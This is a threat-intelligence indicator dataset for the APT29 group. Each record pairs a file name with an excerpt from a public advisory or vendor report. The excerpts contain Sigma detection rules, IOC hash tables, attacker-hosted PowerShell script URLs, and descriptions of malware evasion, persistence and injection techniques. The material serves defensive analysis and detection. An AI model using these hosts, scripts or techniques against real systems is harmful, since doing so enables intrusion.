1.0.0,actor--apt29,artifact--sha256:210e72654fca35669e7919cb014e6ae7cb5525e7c87f5f3e735ff8423170a92c,observation--sha256:6b0c73e0c7ef5ae2facfcf2f08f93aa0ef9b0b0aea188cba5ff7b20d4467263a,file-name,KERNEL32.DLL,KERNEL32.DLL,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 44}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,S2GRUPO | LAB5243 Table 6. Libraries and functions resolved by the first code block LIBRARY API KERNEL32.DLL GetProcessHeap HeapAlloc HeapFree VirtualAlloc VirtualProtect VirtualFree ExitProcess GetSystemFirmwareTable GetVersionExA ADVAPI32.DLL RegOpenKeyExA RegQueryValueExA RegCloseKey MD5Init MD5Update MD5Final USER32.DLL wsprintfA MessageBoxA OLE32.DLL CoInitialize CoInitializeSecurity CoInitializeInstance CoCreateInstance CoSetProxyBlanket CoUninitialize OLEAUT32.DLL VariantClear VariantInit,
1.0.0,actor--apt29,artifact--sha256:a149c54f2c2636c7113620966d0d4902bc800620c4f4b149fac5cdc699581b39,observation--sha256:bde1eae7fd45fb3f2bd65a40b1286cc8581a41422ffdec6453be9af69aaa03f0,file-name,LengthInMemoryActivate.dll,LengthInMemoryActivate.dll,candidate,2023-11-15T00:00:00Z,day,known,same-record,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 17}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,International Partnership Page 17 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR references: author: date: 2023/11/15 logsource: category: image_load product: windows detection: selection: ImageLoaded|endswith: - 'AclNumsInvertHost.dll' - 'ModeBitmapNumericAnimate.dll' - 'UnregisterAncestorAppendAuto.dll' - 'DeregisterSeekUsers.dll' - 'ScrollbarHandleGet.dll' - 'PerformanceCaptionApi.dll' - 'WowIcmpRemoveReg.dll' - 'BlendMonitorStringBuild.dll' - 'HandleFrequencyAll.dll' - 'HardSwapColor.dll',
1.0.0,actor--apt29,artifact--sha256:152873c0bc07c0304164bd898681875cff9667b62f00bd278d11524a070c297d,observation--sha256:336f3dc1f34c67e71f34e255ee0af661b34860393c6c3c8dae58ecf252b974be,file-name,Lets-go-with-a-Go-RAT-_final.pdf,Lets-go-with-a-Go-RAT-_final.pdf,candidate,2018-07-01T00:00:00Z,month,known,same-record,2020-07-09T00:00:00Z,source--apt29--79b26424fe6b8024,APT29/NCSC_APT29_ADVISORY-QUAD-OFFICIAL-20200709-1810.PDF,"{""page"": 15}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,External Reading [1] https://www.ncsc.gov.uk/news/citrix-alert [2] https://www.ncsc.gov.uk/news/alert-vpn-vulnerabilities [3] https://nvd.nist.gov/vuln/detail/CVE-2019-9670 [4] https://blogs.jpcert.or.jp/en/2018/07/malware-wellmes-9b78.html [5] https://www.botconf.eu/wp-content/uploads/2018/12/2018-Y-Ishikawa-S-Nagano- Lets-go-with-a-Go-RAT-_final.pdf Mitigation A variety of mitigations will be of use in defending against the campaigns detailed in this report: • Protect your devices and networks,
1.0.0,actor--apt29,artifact--sha256:97ef1f7158860be0e8573e31e7f1dae843af8f64c4128141a0c33b1551ff25da,observation--sha256:c63cb68bd4960ccedffb1e69011315b1b0cc00ecc062d0cd16e76f9e8ba72d5d,file-name,MSVCP140.dll,MSVCP140.dll,candidate,,unknown,unknown,not-stated,,source--apt29--59d79eb119d7d95b,APT29/APT29 Adapts to Target Diplomatic Entities with GraphicalProton Malware.pdf,"{""page"": 13}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"CYBERTHREATANALYSIS| RUSSIA decrypt thecontentsof theXSD. Thedecryptedcontentscontainshellcodethat isthenexecutedtoextract andloadanembeddedDLL. Inadditiontotheencryptionroutine, theDLLmoduleengagesinadditional detectionevasiontechniquessuchascheckingtoensurethat it isnot runninginasandboxor under adebugger. Afterengagingintheseoperations, themoduleestablishespersistencebycopyingthecontentsof theISOfiletoadirectoryandcreatingaregistryrunkeytoexecutetheEXEduringsystemstartup.Subsequently, it decr",
1.0.0,actor--apt29,artifact--sha256:a41f4aca7111ff9679bd81213eb85c358cf80bd5e674ec5559d4c653a0d6fbf0,observation--sha256:43ef638206d416dcd6bc23cf7401c3888442dbbf9a3a3ad8f391f954b0fde206,file-name,MiniDuke_Paper_Final.pdf,MiniDuke_Paper_Final.pdf,candidate,2013-02-01T00:00:00Z,month,known,same-record,,source--apt29--49eb8cd46560323f,APT29/F-Secure_Dukes_Whitepaper.pdf,"{""page"": 27}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"F-Secure Whitepaper, September 2015 27 The MiniDuke toolset consists of multiple downloader and backdoor components, which are commonly referred to as the MiniDuke “stage 1”, “stage 2”, and “stage 3” components as per Kaspersky’s original MiniDuke whitepaper. Additionally, a specific loader is often associated with the MiniDuke toolset and is referred to as the “MiniDuke loader”. While the loader has often been used together with other MiniDuke components, it has also commonly been used in conju",
1.0.0,actor--apt29,artifact--sha256:c90d463a785c7414eb59de7e456a2e0e9a4718b7f8657dfbc26efccc4ef51db3,observation--sha256:8302094b9e61f37a93a45233c4690129c8a1c6cd2ccc685347788f2b97ec9303,file-name,ModeBitmapNumericAnimate.dll,ModeBitmapNumericAnimate.dll,candidate,2023-11-15T00:00:00Z,day,known,same-record,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 17}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,International Partnership Page 17 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR references: author: date: 2023/11/15 logsource: category: image_load product: windows detection: selection: ImageLoaded|endswith: - 'AclNumsInvertHost.dll' - 'ModeBitmapNumericAnimate.dll' - 'UnregisterAncestorAppendAuto.dll' - 'DeregisterSeekUsers.dll' - 'ScrollbarHandleGet.dll' - 'PerformanceCaptionApi.dll' - 'WowIcmpRemoveReg.dll' - 'BlendMonitorStringBuild.dll' - 'HandleFrequencyAll.dll' - 'HardSwapColor.dll',
1.0.0,actor--apt29,artifact--sha256:8e39b26328c51d29bb39f6c7c6fceedebf72c9ffd4209a984373b4b9ca57f75e,observation--sha256:f5d2cb00a8e7e3704d19e6781dc5cea204c3a6de43faff00b1bb654868a2365a,file-name,ModeFolderSignMove.dll,ModeFolderSignMove.dll,candidate,2023-11-15T00:00:00Z,day,known,same-record,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 17}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,International Partnership Page 17 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR references: author: date: 2023/11/15 logsource: category: image_load product: windows detection: selection: ImageLoaded|endswith: - 'AclNumsInvertHost.dll' - 'ModeBitmapNumericAnimate.dll' - 'UnregisterAncestorAppendAuto.dll' - 'DeregisterSeekUsers.dll' - 'ScrollbarHandleGet.dll' - 'PerformanceCaptionApi.dll' - 'WowIcmpRemoveReg.dll' - 'BlendMonitorStringBuild.dll' - 'HandleFrequencyAll.dll' - 'HardSwapColor.dll',
1.0.0,actor--apt29,artifact--sha256:71d19d372164a5514cf2992d38f43ea9cad383df8f1517b6f7a7903baed8d12c,observation--sha256:b4b144a90245a5a7cbb41f4825ce161fba4b8bc00fd4d8cc8e7f582edeed833a,file-name,Ms20Win32Client.DLL,Ms20Win32Client.DLL,candidate,,unknown,unknown,not-stated,,source--apt29--59d79eb119d7d95b,APT29/APT29 Adapts to Target Diplomatic Entities with GraphicalProton Malware.pdf,"{""page"": 13}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"CYBERTHREATANALYSIS| RUSSIA decrypt thecontentsof theXSD. Thedecryptedcontentscontainshellcodethat isthenexecutedtoextract andloadanembeddedDLL. Inadditiontotheencryptionroutine, theDLLmoduleengagesinadditional detectionevasiontechniquessuchascheckingtoensurethat it isnot runninginasandboxor under adebugger. Afterengagingintheseoperations, themoduleestablishespersistencebycopyingthecontentsof theISOfiletoadirectoryandcreatingaregistryrunkeytoexecutetheEXEduringsystemstartup.Subsequently, it decr",
1.0.0,actor--apt29,artifact--sha256:d3ce50d1999aef155648a90f0ff63ef604c712536158aec7cd7aa41fd69b2c2c,observation--sha256:05ababcb22c810f8388e376870e15efd76fb95b446b77cde876df0278be805ac,file-name,Note.exe,Note.exe,candidate,,unknown,unknown,not-stated,,source--apt29--e18f934655a51e49,APT29/CERT.PL/HALFRIG_.pdf,"{""page"": 2}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Military Counterintelligence Service CERT.PL SNOWYAMBER | 2/20 Table of Contents Table of Contents ................................ ................................ ................................ ................................ ................................ .......... 2 Threat Summary ................................ ................................ ................................ ................................ ................................ ............ 3 Detailed Technical Analysis ,
1.0.0,actor--apt29,artifact--sha256:d3ce50d1999aef155648a90f0ff63ef604c712536158aec7cd7aa41fd69b2c2c,observation--sha256:0f4dce411480f88b4d544be64f1efd480626365f9ccece40e387d37b9ecd1641,file-name,Note.exe,Note.exe,candidate,,unknown,unknown,not-stated,,source--apt29--e18f934655a51e49,APT29/CERT.PL/HALFRIG_.pdf,"{""page"": 5}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL SNOWYAMBER | 5/20 Phishing – Email and Delivery Script Phishing email uses a PDF attachment with a link to the ENVYSCOUT embedded inside. The email itself does not contain any additional malicious content. The lure is consistent with themes of previously observed APT29 phishing emails. HALFRIG has been delivered using a slightly modified, but well-known delivery script called ENVYSCOUT and linked to the APT29 and NOBELIUM activity sets. Container File",
1.0.0,actor--apt29,artifact--sha256:d3ce50d1999aef155648a90f0ff63ef604c712536158aec7cd7aa41fd69b2c2c,observation--sha256:528b922dc47c5fd35c6f3803812f1666cb9a16ae2d4b716c09b3f844c605336e,file-name,Note.exe,Note.exe,candidate,,unknown,unknown,not-stated,,source--apt29--e18f934655a51e49,APT29/CERT.PL/HALFRIG_.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL SNOWYAMBER | 6/20 HALFRIG Analysis HALFRIG is a simplistic but heavily obfuscated stager. It is written in C and uses WINAPI to facilitate most capabilities. The execution chain is split into 4 DLL files, each responsible for a small part of overall capability5 – i.e. setting up persistence. Aside from obfuscation (which we were not able to link to any open source/publicly available tool), HALFRIG incorporates OPSEC techniques to unhook EDR, verify if",
1.0.0,actor--apt29,artifact--sha256:d3ce50d1999aef155648a90f0ff63ef604c712536158aec7cd7aa41fd69b2c2c,observation--sha256:b2e652dfa0ec31430a3a2f7744544c6af7973cbef5b6e3891fb3e2eeeaa78e66,file-name,Note.exe,Note.exe,candidate,,unknown,unknown,not-stated,,source--apt29--e18f934655a51e49,APT29/CERT.PL/HALFRIG_.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL SNOWYAMBER | 9/20 msword.dll This module facilitates OPSEC (unhooking, checking for sleep() emulation, checking for process tree). The module contains a large number of inlined string decryption routines. The following listing presents (heavily) cleaned-up code of the msword.dll get export that is called by AppvIsvSubsystems64.dll: 1. __int64 get() 2. { 3. // 4. pUnhookedAPIs = getAPIs(&UnhookedAPIs); 5. pProcessModules = &UnhookedAPIs.K32EnumProcessM",
1.0.0,actor--apt29,artifact--sha256:d3ce50d1999aef155648a90f0ff63ef604c712536158aec7cd7aa41fd69b2c2c,observation--sha256:786d52edf912992e8fb42b089a49eaafc38c44aead4a3a9f5d3fe8fd319b5318,file-name,Note.exe,Note.exe,candidate,,unknown,unknown,not-stated,,source--apt29--813411ec01acb3f6,APT29/CERT.PL/IoC_Reference_.pdf,"{""page"": 8}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Military Counterintelligence Service CERT.PL SNOWYAMBER | 8/11 QUARTERRIG Indicator Value Legitimate executable used to load the malicious DLL File Name Note.exe File Size 1600KB MD5 b1820abc3a1ce2d32af04c18f9d2bfc3 SHA1 b260d80fa81885d63565773480ca1e436ab657a0 SHA256 6c55195f025fb895f9d0ec3edbf58bc0aa46c43eeb246cfb88eef1ae051171b3 Indicator Value Virtual disc container File Name Note.iso File Size 2624KB MD5 22adbffd1dbf3e13d036f936049a2e98 SHA1 52932be0bd8e381127aab9c639e6699fd1ecf268 SHA256 c,
1.0.0,actor--apt29,artifact--sha256:d3ce50d1999aef155648a90f0ff63ef604c712536158aec7cd7aa41fd69b2c2c,observation--sha256:82c163533a932d6ff180dcce9de447ef83c5746be80ed7df054826fa8be1882a,file-name,Note.exe,Note.exe,candidate,,unknown,unknown,not-stated,,source--apt29--2dacc4165567600f,APT29/CERT.PL/QUARTERRIG_.pdf,"{""page"": 13}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL QUARTERRIG | 13/36 QUARTERRIG’s execution is facilitated via a new entry to the Run registry key (\Software\Microsoft\Windows\CurrentVersion\Run), with the value name d as OfficeBackendWorker. The value set up in the Run key refers to the Note.exe executable - <FOLDERID_LocalAppData>\OfficeBackendWorker\Note.exe. Once the persistence is set up, the process proceeds to launch another stage. It starts off by retrieving a path to the ""ole32.dll"" file by ",
1.0.0,actor--apt29,artifact--sha256:d3ce50d1999aef155648a90f0ff63ef604c712536158aec7cd7aa41fd69b2c2c,observation--sha256:5591f2fc4338654dad855892f4c6e500de04624aca55c50e534953c8d3e16003,file-name,Note.exe,Note.exe,candidate,,unknown,unknown,not-stated,,source--apt29--2dacc4165567600f,APT29/CERT.PL/QUARTERRIG_.pdf,"{""page"": 31}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Military Counterintelligence Service CERT.PL QUARTERRIG | 31/36 Appendix A – IOCs File IoCs Indicator Value Virtual disc container File Name Note.iso File Size 2624KB MD5 22adbffd1dbf3e13d036f936049a2e98 SHA1 52932be0bd8e381127aab9c639e6699fd1ecf268 SHA256 c03292fca415b51d08da32e2f7226f66382eb391e19d53e3d81e3e3ba73aa8c1 Indicator Value Legitimate executable used to load the malicious DLL File Name Note.exe File Size 1600KB MD5 b1820abc3a1ce2d32af04c18f9d2bfc3 SHA1 b260d80fa81885d63565773480ca1e4,
1.0.0,actor--apt29,artifact--sha256:dcda27a5b73e79ce3e141b1b9d3e380b7b90ee26ad70570b710ac91a3e920cf4,observation--sha256:38d6cbf0a7a2fa22d424cef0f7f54d91b1bd61f84ac841a9a3ca259b55ed907c,file-name,Note.zip,Note.zip,candidate,,unknown,unknown,not-stated,,source--apt29--59d79eb119d7d95b,APT29/APT29 Adapts to Target Diplomatic Entities with GraphicalProton Malware.pdf,"{""page"": 13}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"CYBERTHREATANALYSIS| RUSSIA decrypt thecontentsof theXSD. Thedecryptedcontentscontainshellcodethat isthenexecutedtoextract andloadanembeddedDLL. Inadditiontotheencryptionroutine, theDLLmoduleengagesinadditional detectionevasiontechniquessuchascheckingtoensurethat it isnot runninginasandboxor under adebugger. Afterengagingintheseoperations, themoduleestablishespersistencebycopyingthecontentsof theISOfiletoadirectoryandcreatingaregistryrunkeytoexecutetheEXEduringsystemstartup.Subsequently, it decr",
1.0.0,actor--apt29,artifact--sha256:f3dfda06973424b5820d64dcdf84a2a933997dba0aaf7f8ab4d792fa45bc558b,observation--sha256:03e5741795618722eed3967788e56a158401f2dedde15431df37baf43f6abfbb,file-name,OLE32.DLL,OLE32.DLL,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 44}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,S2GRUPO | LAB5243 Table 6. Libraries and functions resolved by the first code block LIBRARY API KERNEL32.DLL GetProcessHeap HeapAlloc HeapFree VirtualAlloc VirtualProtect VirtualFree ExitProcess GetSystemFirmwareTable GetVersionExA ADVAPI32.DLL RegOpenKeyExA RegQueryValueExA RegCloseKey MD5Init MD5Update MD5Final USER32.DLL wsprintfA MessageBoxA OLE32.DLL CoInitialize CoInitializeSecurity CoInitializeInstance CoCreateInstance CoSetProxyBlanket CoUninitialize OLEAUT32.DLL VariantClear VariantInit,
1.0.0,actor--apt29,artifact--sha256:f1b5aa1da2ba7a2142feb69367117f00607535663cbf4cf1725be8da351affef,observation--sha256:3fa0eec52fdef79538e558cdd81ad5ee8b4fbef15f201c1a7042b9af27199648,file-name,OLEAUT32.DLL,OLEAUT32.DLL,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 44}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,S2GRUPO | LAB5243 Table 6. Libraries and functions resolved by the first code block LIBRARY API KERNEL32.DLL GetProcessHeap HeapAlloc HeapFree VirtualAlloc VirtualProtect VirtualFree ExitProcess GetSystemFirmwareTable GetVersionExA ADVAPI32.DLL RegOpenKeyExA RegQueryValueExA RegCloseKey MD5Init MD5Update MD5Final USER32.DLL wsprintfA MessageBoxA OLE32.DLL CoInitialize CoInitializeSecurity CoInitializeInstance CoCreateInstance CoSetProxyBlanket CoUninitialize OLEAUT32.DLL VariantClear VariantInit,
1.0.0,actor--apt29,artifact--sha256:79c9975621c039aff3656e471ae41130a8541fee4d9c2453b90f603a522a839f,observation--sha256:a6beffb93a16513c7736fdb4ae95c292e01507dcad97bcfd4d8318b2a16e9860,file-name,ParametersNamesPopup.dll,ParametersNamesPopup.dll,candidate,2023-11-15T00:00:00Z,day,known,same-record,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 17}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,International Partnership Page 17 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR references: author: date: 2023/11/15 logsource: category: image_load product: windows detection: selection: ImageLoaded|endswith: - 'AclNumsInvertHost.dll' - 'ModeBitmapNumericAnimate.dll' - 'UnregisterAncestorAppendAuto.dll' - 'DeregisterSeekUsers.dll' - 'ScrollbarHandleGet.dll' - 'PerformanceCaptionApi.dll' - 'WowIcmpRemoveReg.dll' - 'BlendMonitorStringBuild.dll' - 'HandleFrequencyAll.dll' - 'HardSwapColor.dll',
1.0.0,actor--apt29,artifact--sha256:bb804b90ded50c212828536db911e33caa33b2530f4c7babe8ee57d1c491f1c1,observation--sha256:0b9db4693cbdf8682ee1e0a2a2ee5d58bb5090c05a1c94035db07896b8e5e0a3,file-name,PerformanceCaptionApi.dll,PerformanceCaptionApi.dll,candidate,2023-11-15T00:00:00Z,day,known,same-record,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 17}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,International Partnership Page 17 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR references: author: date: 2023/11/15 logsource: category: image_load product: windows detection: selection: ImageLoaded|endswith: - 'AclNumsInvertHost.dll' - 'ModeBitmapNumericAnimate.dll' - 'UnregisterAncestorAppendAuto.dll' - 'DeregisterSeekUsers.dll' - 'ScrollbarHandleGet.dll' - 'PerformanceCaptionApi.dll' - 'WowIcmpRemoveReg.dll' - 'BlendMonitorStringBuild.dll' - 'HandleFrequencyAll.dll' - 'HardSwapColor.dll',
1.0.0,actor--apt29,artifact--sha256:d25c2b57b77751e092f3636e7605ec71f51b64c636e9bb617b0770ca09b1f7e4,observation--sha256:3852706b8f7173ce7d6f3426330e06575dc50a29736d174db9fb138ceb66713c,file-name,PowerUp.ps1,PowerUp.ps1,candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 45}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,TLP:WHITE SilverFish APT Group 6.9 Javascript Injection Points jenkins.findfwd.com/sk-jspark_init.php test.directfwd.com/sk-jspark_init.php securesearchnow.com/sk-jspark_init.php alertmeter.info/sk-jspark_init.php freeresultsguide.com/sk-jspark_init.php 6.10 External Post-Exploitation Scripts 141.136.0.4/46tt83y6.ps1 173.232.146.12/Invoke-SocksProxy.psm1 176.10.118.136/pwrvw.ps1 179.43.141.188:80/46tt83y6.ps1 179.43.141.188:81/46tt83y6.ps1 179.43.141.188:82/46tt83y6.ps1 179.43.141.188:83/46tt83y,
1.0.0,actor--apt29,artifact--sha256:c077e38d4892f3399cda7ac1d8c486320ce283b6680fdc4fb0b7645a38d54154,observation--sha256:717b1f4cf45f8352a3fae4560a3e68e4beb723196df326264ac53fe94f6a5c62,file-name,PowerView.ps1,PowerView.ps1,candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 45}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,TLP:WHITE SilverFish APT Group 6.9 Javascript Injection Points jenkins.findfwd.com/sk-jspark_init.php test.directfwd.com/sk-jspark_init.php securesearchnow.com/sk-jspark_init.php alertmeter.info/sk-jspark_init.php freeresultsguide.com/sk-jspark_init.php 6.10 External Post-Exploitation Scripts 141.136.0.4/46tt83y6.ps1 173.232.146.12/Invoke-SocksProxy.psm1 176.10.118.136/pwrvw.ps1 179.43.141.188:80/46tt83y6.ps1 179.43.141.188:81/46tt83y6.ps1 179.43.141.188:82/46tt83y6.ps1 179.43.141.188:83/46tt83y,
1.0.0,actor--apt29,artifact--sha256:38ee55c29b8c598cbb5c71f9333994f08e7a3f51e408cb01dafae07dfbcef3d4,observation--sha256:b6ea5c2bd6aec19d480c20617d91b9defef665832a736cc6d788fa39f49dc3ef,file-name,RTCore64.sys,RTCore64.sys,candidate,2023-11-15T00:00:00Z,day,known,same-record,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 20}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,International Partnership Page 20 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR description: Suspicious registry modifications author: references: date: 2023/11/15 logsource: category: registry_set product: windows detection: selection: EventID: 4657 TargetObject|contains: - 'CurrentControlSet\\Control\\Lsa\\DisableRestrictedAdmin' - 'CurrentControlSet\\Control\\Lsa\\NoLmHash' condition: selection title: Registry modification from cmd description: Registry modification from cmd author: refer,
1.0.0,actor--apt29,artifact--sha256:6ed4a1a7451c4439c2f654c14d544519b2e52709854723ebd29b6c09db0a9738,observation--sha256:b874fc17e917e2964e6dc998ca1ce07439e5b192b8a45b617c3443a591c0fa61,file-name,RunTimeBroker.exe,RunTimeBroker.exe,candidate,,unknown,unknown,not-stated,,source--apt29--e18f934655a51e49,APT29/CERT.PL/HALFRIG_.pdf,"{""page"": 10}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL SNOWYAMBER | 10/20 If OPSEC checks are passed, a new thread is spawned. The new thread again executes the same OPSEC- related code blocks (initialize APIs, unhook modules, check for sleep emulation, check for proper parent name) and, if all checks are passed, loads and injects the next stage into a randomly selected process. 1. __int64 InjectThread() 2. { 3. // Reused code blocks have been simplified 4. ResolveAPIs(); 5. UnhookDLLs(); 6. CheckForSleep",
1.0.0,actor--apt29,artifact--sha256:2e5f1f0e0f066ead74e98e92d3ff8ee3e94b14dc6396ee70de5d7a2c344c6086,observation--sha256:3aee4f5cfbe036bf786137b1e48855cef07a5f1f105422794c13aaa20af71460,file-name,Runnder.dll,Runnder.dll,candidate,,unknown,unknown,not-stated,,source--apt29--2dacc4165567600f,APT29/CERT.PL/QUARTERRIG_.pdf,"{""page"": 11}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL QUARTERRIG | 11/36 Reconstructed export hashing can be illustrated using the following script: def hash(x): s = 0 for x in x.encode(): s = ror(s, 13) + x return s Hashed export name found in the shellcode corresponds to “runnder_dll”. >>> hash(""runner_dll\x00"") 3137192214 3rd Stage – Intermediate Shellcode Loader – runner.dll Runner.dll is an intermediate step loader – it is similar in implementation and in functionality to hijacker.dll. Runnder.dll i",
1.0.0,actor--apt29,artifact--sha256:eb605503c4ef6e625f7caa718ad2d1b25f5f6876e7e348dfd45888122e944c01,observation--sha256:53a1c5b310914ae1a82e39383046bb7fc3268760a7c01a9f9b4da564fdb03673,file-name,Runner.dll,Runner.dll,candidate,,unknown,unknown,not-stated,,source--apt29--2dacc4165567600f,APT29/CERT.PL/QUARTERRIG_.pdf,"{""page"": 11}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL QUARTERRIG | 11/36 Reconstructed export hashing can be illustrated using the following script: def hash(x): s = 0 for x in x.encode(): s = ror(s, 13) + x return s Hashed export name found in the shellcode corresponds to “runnder_dll”. >>> hash(""runner_dll\x00"") 3137192214 3rd Stage – Intermediate Shellcode Loader – runner.dll Runner.dll is an intermediate step loader – it is similar in implementation and in functionality to hijacker.dll. Runnder.dll i",
1.0.0,actor--apt29,artifact--sha256:eb605503c4ef6e625f7caa718ad2d1b25f5f6876e7e348dfd45888122e944c01,observation--sha256:46718051c8b9c23c2b712172853d72604d3cf1f6e77bc8258639e298c04685c5,file-name,Runner.dll,Runner.dll,candidate,,unknown,unknown,not-stated,,source--apt29--2dacc4165567600f,APT29/CERT.PL/QUARTERRIG_.pdf,"{""page"": 13}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL QUARTERRIG | 13/36 QUARTERRIG’s execution is facilitated via a new entry to the Run registry key (\Software\Microsoft\Windows\CurrentVersion\Run), with the value name d as OfficeBackendWorker. The value set up in the Run key refers to the Note.exe executable - <FOLDERID_LocalAppData>\OfficeBackendWorker\Note.exe. Once the persistence is set up, the process proceeds to launch another stage. It starts off by retrieving a path to the ""ole32.dll"" file by ",
1.0.0,actor--apt29,artifact--sha256:463c5f56aad8b11f6fab369eef7217b7e1cac46276a5d91ec469ffd51fb19c5c,observation--sha256:4281d32661f92ccfa9d2a4ba102cb9bdfa22465f5ba3759c3313747aae172c19,file-name,Schedule.zip,Schedule.zip,candidate,,unknown,unknown,not-stated,,source--apt29--6e4bed3453bfe94f,APT29/CERT.PL/SNOWYAMBER_.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL SNOWYAMBER | 7/24 Container File – ZIP In October 2022, the adversary used a ZIP archive to deliver SNOWYAMBER. Schedule.zip contained the following files: . ├── 7za.dll ├── november_schedul exe.pdf └── vcruntime140.dll Filename november_schedulexe.pdf uses the right-to-left override technique to attempt to mimic the pdf extension while in fact, it is .exe. The file is a renamed, legitimate 7-zip executable. Vcruntime140.dll is a benign, although modi",
1.0.0,actor--apt29,artifact--sha256:7146aeff6602ca04ae976fa5f5a49825bd8609c389b7db3b3cef4780852fb4ce,observation--sha256:40ff659eeb7ec673173f980d366c11b242432e58b27b6b7ae64df377d443e20b,file-name,ScrollbarHandleGet.dll,ScrollbarHandleGet.dll,candidate,2023-11-15T00:00:00Z,day,known,same-record,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 17}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,International Partnership Page 17 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR references: author: date: 2023/11/15 logsource: category: image_load product: windows detection: selection: ImageLoaded|endswith: - 'AclNumsInvertHost.dll' - 'ModeBitmapNumericAnimate.dll' - 'UnregisterAncestorAppendAuto.dll' - 'DeregisterSeekUsers.dll' - 'ScrollbarHandleGet.dll' - 'PerformanceCaptionApi.dll' - 'WowIcmpRemoveReg.dll' - 'BlendMonitorStringBuild.dll' - 'HandleFrequencyAll.dll' - 'HardSwapColor.dll',
1.0.0,actor--apt29,artifact--sha256:ec4789855e3e089095f5efdb2cf8bc60476c231baab499c2ac8e37a9758beabc,observation--sha256:43d5196bc5d963be58fe6a8a226090b493470d0c343dd5fdf6c43d36811edb5d,file-name,Sea.docx,Sea.docx,candidate,,unknown,unknown,not-stated,,source--apt29--49eb8cd46560323f,APT29/F-Secure_Dukes_Whitepaper.pdf,"{""page"": 21}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"F-Secure Whitepaper, September 2015 21 2015: Continuing surgical strikes with CosmicDuke In addition to the notably overt and large-scale campaigns with CozyDuke and CloudDuke, the Dukes also continued to engage in more covert, surgical campaigns using CosmicDuke. The latest of these campaigns that we are aware of occurred during the spring and early summer of 2015. As their infection vectors, these campaigns used malicious documents exploiting recently fixed vulnerabilities. Two of these campai",
